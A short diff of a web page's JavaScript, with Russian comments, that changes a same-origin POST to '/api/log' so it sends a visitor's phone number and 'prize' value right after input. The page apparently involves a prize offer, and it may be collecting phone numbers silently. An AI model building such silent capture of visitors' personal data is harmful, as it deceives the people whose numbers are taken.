@@ -214,11 +214,11 @@
 
   // 1️⃣ Отправляем лог сразу после ввода
   try {
-    await fetch("/api/log", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ message: `Новый номер: ${phone}` })
-    });
+await fetch("/api/log", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ phone, prize })
+});
   } catch(err) {
     console.error("Ошибка отправки лога:", err);
   }
@@ -319,6 +319,7 @@ continueBtn.onclick = async () => {
 </div> -->
 </body>
 </html>
+
 
 
 
